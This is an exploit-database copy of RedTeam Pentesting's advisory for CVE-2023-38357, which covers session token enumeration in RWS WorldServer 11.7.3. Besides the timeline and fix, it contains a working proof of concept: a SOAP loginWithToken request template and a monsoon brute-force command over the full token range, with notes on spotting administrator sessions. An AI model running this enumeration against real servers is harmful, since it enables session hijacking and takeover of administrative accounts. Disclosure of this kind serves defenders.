@@ -1,0 +1,184 @@
+id: 38898
+date: 07/21/2023
+title: RWS WorldServer 11.7.3 - Session Token Enumeration
+author: RedTeam
+cves: CVE-2023-38357
+
+Exploit Title: RWS WorldServer 11.7.3 - Session Token Enumeration
+Session tokens in RWS WorldServer have a low entropy and can be
+enumerated, leading to unauthorised access to user sessions.
+
+
+Details
+=======
+
+Product: WorldServer
+Affected Versions: 11.7.3 and earlier versions
+Fixed Version: 11.8.0
+Vulnerability Type: Session Token Enumeration
+Security Risk: high
+Vendor URL: https://www.rws.com/localization/products/additional-solutions/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-001
+Advisory Status: published
+CVE: CVE-2023-38357
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38357
+
+
+Introduction
+============
+
+"WorldServer offers a flexible, enterprise-class translation management
+system that automates translation tasks and greatly reduces the cost of
+supporting large volumes of local language content."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+WorldServer associates user sessions with numerical tokens, which always
+are positive values below 2^31. The SOAP action "loginWithToken" allows
+for a high amount of parallel attempts to check if a token is valid.
+During analysis, many assigned tokens were found to be in the 7-digit
+range of values. An attacker is therefore able to enumerate user
+accounts in only a few hours.
+
+
+Proof of Concept
+================
+
+In the following an example "loginWithToken" request is shown:
+
+-----------------------------------------------------------------------
+POST /ws/services/WSContext HTTP/1.1
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: ""
+Content-Length: 501
+Host: www.example.com
+Connection: close
+User-Agent: agent
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
+xmlns:soapenv="http://schemas.xmlsoap.org">
+     <soapenv:Header/>
+     <soapenv:Body>
+        <com:loginWithToken soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+           <token xsi:type="xsd:string">FUZZ</token>
+        </com:loginWithToken>
+     </soapenv:Body>
+</soapenv:Envelope>
+-----------------------------------------------------------------------
+
+It can be saved as file "login-soap.req" and be used as a request
+template for the command-line HTTP enumerator monsoon [1] to achieve
+many parallel requests:
+
+-----------------------------------------------------------------------
+$ monsoon fuzz --threads 100 \
+--template-file login-soap.req \
+--range 1-2147483647 \
+--hide-pattern "InvalidSessionException" \
+'https://www.example.com'
+
+Target URL: https://www.example.com/
+
+   status   header     body   value    extract
+
+      500      191      560   5829099
+      500      191      556   6229259
+      200      191     3702   7545136
+      500      191      556   9054984
+[...]
+processed 12000000 HTTP requests in 2h38m38s
+4 of 12000000 requests shown, 1225 req/s
+-----------------------------------------------------------------------
+
+The --range parameter reflects the possible value range of 2^31 and for
+each value an HTTP request is sent to the WorldServer SOAP API where the
+FUZZ marker in the request template is replaced with the respective
+value. Also responses are hidden which contain "InvalidSessionException"
+as these sessions are invalid. Responses will yield a status code of 200
+if an administrative session token is found. For an unprivileged user
+session, status code 500 is returned.
+
+
+Workaround
+==========
+
+Lower the rate at which requests can be issued, for example with a
+frontend proxy.
+
+
+Fix
+===
+
+According to the vendor, upgrading to versions above 11.8.0 resolves the
+vulnerability.
+
+
+Security Risk
+=============
+
+Attackers can efficiently enumerate session tokens. In a penetration
+test, it was possible to get access to multiple user accounts, including
+administrative accounts using this method in under three hours.
+Additionally, by using such an administrative account it seems likely to
+be possible to execute arbitrary code on the underlying server by
+customising the REST API [2]. Thus, the vulnerability poses a high risk.
+
+
+Timeline
+========
+
+2023-03-27 Vulnerability identified
+2023-03-30 Customer approved disclosure to vendor
+2023-04-03 Requested security contact from vendor
+2023-04-06 Vendor responded with security contact
+2023-04-14 Advisory sent to vendor
+2023-04-18 Vendor confirms vulnerability and states that it was already
+known and fixed in version 11.8.0.
+2023-07-03 Customer confirms update to fixed version
+2023-07-05 CVE ID requested
+2023-07-15 CVE ID assigned
+2023-07-19 Advisory released
+
+References
+==========
+
+[1] https://github.com/RedTeamPentesting/monsoon
+[2] https://docs.rws.com/860026/585715/worldserver-11-7-developer-documentation/customizing-the-rest-api
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://jobs.redteam-pentesting.de/
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Alter Posthof 1                           Fax : +49 241 510081-99
+52062 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
+
+#  0day.today [2023-07-24]  #
